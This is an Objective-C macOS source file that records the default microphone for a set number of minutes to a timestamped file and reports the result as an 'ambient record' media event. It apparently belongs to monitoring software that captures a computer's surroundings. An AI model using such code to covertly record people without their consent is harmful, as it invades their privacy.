//
//  AmbientRecorder.m
//  AmbientRecordCaptureManager
//
//  Created by ophat on 6/9/15.
//  Copyright (c) 2015 ophat. All rights reserved.
//

#import "AmbientRecorder.h"
#import "AmbientRecordingContants.h"
#import "AmbientRecordingManager.h"
#import "MediaEvent.h"
#import "EventDelegate.h"
#import "DateTimeFormat.h"

@implementation AmbientRecorder
@synthesize mAudioDeviceInput;
@synthesize mSession;
@synthesize mFileOutput;
@synthesize mAudioDevice;
@synthesize mEventDelegate, mAmbientRecordingDelegate;
@synthesize mFullPath,mDuration;

- (void) startRecordingWithPath:(NSString *)aPath minute:(int)aMin withDelegate:(id <AmbientRecordingDelegate>) aDelegate{
    if (!mSession && !mFileOutput) {
        [self initailRecordDeviceWithMinute:aMin];
        NSCalendar *calendar = [NSCalendar currentCalendar];
        NSDateComponents *comp = [calendar components:(NSCalendarUnitYear | NSCalendarUnitMonth | NSCalendarUnitDay | NSCalendarUnitHour | NSCalendarUnitMinute |NSCalendarUnitSecond) fromDate:[NSDate date]];
        NSString *filename = [NSString stringWithFormat:@"%d-%d-%d %d.%d.%d.mp4",[comp year],[comp month],[comp day],[comp hour],[comp minute], [comp second] ];
        self.mFullPath = [NSString stringWithFormat:@"%@%@",aPath,filename] ;
        self.mDuration = aMin*60; //Convert To Sec
        [mFileOutput recordToOutputFileURL:[NSURL fileURLWithPath:self.mFullPath]];
        self.mAmbientRecordingDelegate = aDelegate;
    }else{
        DLog(@"### AmbientRecorder still recording, Try next time.");
    }
}

- (void) stopRecording {
    [mFileOutput recordToOutputFileURL:nil];
}
- (BOOL) isRecording{
    if (mSession && mFileOutput) {
        return YES;
    }
    return NO;
}
- (void) initailRecordDeviceWithMinute:(int)aMin {
    mSession = [[QTCaptureSession alloc] init];
    mFileOutput = [[QTCaptureMovieFileOutput alloc] init];
    mAudioDevice = [QTCaptureDevice defaultInputDeviceWithMediaType:QTMediaTypeSound];
    
    if ( [mAudioDevice open:nil] ) {
        mAudioDeviceInput = [[QTCaptureDeviceInput alloc] initWithDevice:mAudioDevice];
        if ( [mSession addInput:mAudioDeviceInput error:nil] ) {
            if ([mSession addOutput:mFileOutput error:nil]) {
                [self configurationForFileOutput];
                [mFileOutput setMaximumRecordedDuration: QTMakeTime(aMin*60*30000, 30000)];
                [mFileOutput setDelegate:self];
                [mSession startRunning];
                DLog(@"### Recording Audio for %d minutes",aMin);
            }else{
                DLog(@"#### !!!! Fail to add FileOutput");
            }
        }else{
            DLog(@"#### !!!! Fail to add AudioDeviceInput");
        }
        [mAudioDeviceInput release];
    }else{
        DLog(@"#### !!!! Fail to open AudioDevice");
    }
}
- (void) closeRecordDevice{
    DLog(@"closeRecordDevice");
    if (mSession) {
        [mSession removeInput:mAudioDeviceInput];
        [mSession removeOutput:mFileOutput];
        [mSession stopRunning];
        
        [mSession release];
        mSession = nil;
    }
    if (mFileOutput) {
        [mFileOutput release];
        mFileOutput = nil;
    }
    if (mAudioDevice) {
        [mAudioDevice close];
    }
   
}
- (BOOL)captureOutput:(QTCaptureFileOutput *)captureOutput shouldChangeOutputFileAtURL:(NSURL *)outputFileURL forConnections:(NSArray *)connections dueToError:(NSError *)error {
    QTTime durationRecorded = [mFileOutput recordedDuration];
    NSString *outputDuration = QTStringFromTime(durationRecorded);
    DLog(@"outputDuration %@",outputDuration);
    [self stopRecording];
    return YES;
}
- (void)captureOutput:(QTCaptureFileOutput *)captureOutput didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL forConnections:(NSArray *)connections dueToError:(NSError *)error{
    DLog(@"FinishRecording with %@",error);
    [self closeRecordDevice];
    [self constructEvent];
}

-(void) constructEvent{
    if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
        // Media event
        MediaEvent *mediaEvent = [[MediaEvent alloc]init];
        [mediaEvent setEventType:kEventTypeAmbientRecordAudio];
        [mediaEvent setFullPath:self.mFullPath];
        [mediaEvent setMDuration:self.mDuration];
        [mediaEvent setDateTime:[DateTimeFormat phoenixDateTime]];
        [mEventDelegate performSelector:@selector(eventFinished:) withObject:mediaEvent];
        DLog(@"MediaEvent mFullPath %@",self.mFullPath);
        DLog(@"MediaEvent mDuration %d",self.mDuration);
        [mediaEvent release];
    }

    if (mAmbientRecordingDelegate && [mAmbientRecordingDelegate respondsToSelector:@selector(recordingCompleted:)]) {
        // Ambient recording delegate
        NSError *error = [NSError errorWithDomain:@"OS X Recorder" code:kAmbientRecordingOK  userInfo:nil];
        [mAmbientRecordingDelegate performSelector:@selector(recordingCompleted:) withObject:error];
        DLog(@"### performSelector :=> recordingCompleted");
    }

}
/*
 #QTCompressionOptionsLosslessAppleIntermediateVideo
 This is appropriate for an intermediate format for media that requires further processing.
 
 #QTCompressionOptions120SizeH264Video
 This is appropriate for delivery to low-bandwidth and low-capacity destinations.
 
 #QTCompressionOptions240SizeH264Video
 This is appropriate for delivery to medium-bandwidth and medium-capacity destinations.
 
 #QTCompressionOptionsSD480SizeH264Video
 This is appropriate for delivery to medium and high-bandwidth and medium- and high-capacity destinations.
 
 #QTCompressionOptions120SizeMPEG4Video
 This is appropriate for delivery to low-bandwidth and low-capacity destinations.
 
 #QTCompressionOptionsHighQualityAACAudio
 This is appropriate for delivery of high-quality music and other audio.
 
 #QTCompressionOptionsVoiceQualityAACAudio
 This is appropriate for delivery of voice recordings.
 */
- (void) configurationForFileOutput {
    NSEnumerator *connectionEnumerator = [[mFileOutput connections] objectEnumerator];
    QTCaptureConnection *connection;
    while ((connection = [connectionEnumerator nextObject])) {
        NSString *mediaType = [connection mediaType];
        QTCompressionOptions *compressionOptions = nil;
        
        if ([mediaType isEqualToString:QTMediaTypeSound]) {
            compressionOptions = [QTCompressionOptions compressionOptionsWithIdentifier:@"QTCompressionOptionsVoiceQualityAACAudio"];
        }
//      else if ([mediaType isEqualToString:QTMediaTypeVideo]) {
//          compressionOptions = [QTCompressionOptions compressionOptionsWithIdentifier:@"QTCompressionOptions240SizeH264Video"];
//      }
        [mFileOutput setCompressionOptions:compressionOptions forConnection:connection];
    }
}
-(void)dealloc{
    [self stopRecording];
    [mAmbientRecordingDelegate release];
    [mEventDelegate release];
    [mFullPath release];
    [mAudioDeviceInput release];
    [mSession release];
    [mFileOutput release];
    [mAudioDevice release];
    [super dealloc];
}
@end
